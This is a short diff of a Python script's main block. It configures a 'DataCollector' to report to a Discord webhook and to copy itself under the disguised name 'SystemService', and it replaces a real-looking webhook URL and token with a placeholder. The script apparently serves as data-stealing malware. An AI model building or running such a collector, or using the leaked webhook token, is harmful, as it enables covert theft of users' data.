@@ -160,7 +160,7 @@ class DataCollector:
 
 if __name__ == "__main__":
    
-    webhook_url = "https://discord.com/api/webhooks/1362362914266288158/lYqfPUXU44QBuCm96OHZvzBe_FFXT_uekatlanSRQQldlDImETzwLR4xF_d1vICgqPXy"  # Set to "YOUR_DISCORD_WEBHOOK_URL" for webhook, None for local logging
+    webhook_url = "https://discord.com/-url"  # Set to "YOUR_DISCORD_WEBHOOK_URL" for webhook, None for local logging
     custom_name = "SystemService"  # Change to your desired name
     collector = DataCollector(webhook_url, copy_name=custom_name)
     collector.run()
